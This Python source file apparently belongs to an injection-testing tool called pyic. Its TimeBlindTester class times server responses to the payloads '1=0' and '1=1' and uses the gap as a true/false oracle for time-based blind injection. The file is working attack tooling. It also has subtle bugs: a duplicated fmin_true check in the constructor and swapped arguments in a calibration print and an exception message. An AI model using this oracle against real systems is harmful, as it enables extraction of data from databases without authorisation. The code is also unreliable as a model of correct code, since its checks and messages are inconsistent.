import sys

from pyic.tools import request_time


class TimeBlindTester:
    CALIBRATE_TEST_PASSES = 10

    def __init__(self, rb, fmax_false=-1, fmin_true=-1):
        self.rb = rb
        if fmin_true == -1 or fmin_true == -1:
            self.calibrate()
        else:
            self.fmin_true = fmin_true
            self.fmax_false = fmax_false

        print('[*] min_value for True = {}'.format(self.fmin_true))
        print('[*] max_value for False = {}'.format(self.fmax_false))

    def test(self, payload):

        for i in range(3):
            delta = request_time(self.rb, payload)
            if delta < self.fmax_false:
                return False
            if delta > self.fmin_true:
                return True

        raise Exception('Time value too close ({} < delta = {} < {}), can\'t determine True of False, '
                        'try to increase the sleep delay or change the values of TimeBlindTester params "help(TimeBlindTester)"'
                        .format(self.fmax_false, delta, self.fmin_true))

    def calibrate(self):

        min_false = sys.maxsize
        max_false = -1

        min_true = sys.maxsize
        max_true = -1

        print('[*] Start callibrate...')

        avg_true = 0
        avg_false = 0

        for i in range(0, self.CALIBRATE_TEST_PASSES):

            print('[*] Passe {}'.format(i))

            t = request_time(self.rb, '1=0')
            print('[*] get {} for False'.format(t))

            avg_false += t

            if min_false > t:
                min_false = t
            if max_false < t:
                max_false = t

            t = request_time(self.rb, '1=1')
            print('[*] get {} for True'.format(t))

            avg_true += t

            if min_true > t:
                min_true = t
            if max_true < t:
                max_true = t

        avg_false /= self.CALIBRATE_TEST_PASSES
        avg_true /= self.CALIBRATE_TEST_PASSES

        print('[*] avg False = {}'.format(avg_false))
        print('[*] avg True = {}'.format(avg_true))

        delta_true = max_true - min_true
        delta_false = max_false - min_false

        print('[*] delta False = {}'.format(delta_false))
        print('[*] delta True = {}'.format(delta_true))

        delta = max(delta_true / 4, delta_false / 4, min_false / 4, (avg_true - avg_false) / 4)

        self.fmin_true = min_true
        self.fmax_false = max_false

        print('[+] fmax_false = {}, fmin_true = {}, delta = {}'.format(delta, self.fmax_false, self.fmin_true))

        if self.fmin_true <= self.fmax_false:
            raise Exception('[-] Callibrate fail, max_false = {} need to be < min_true {}'
                            .format(self.fmin_true, self.fmax_false))

        if abs(self.fmin_true - self.fmax_false) < delta:
            raise Exception('[-] Callibrate fail, false and true values are too close, delta is too big '
                            '({}, {}), delta = {})'.format(self.fmin_true, self.fmax_false, delta))
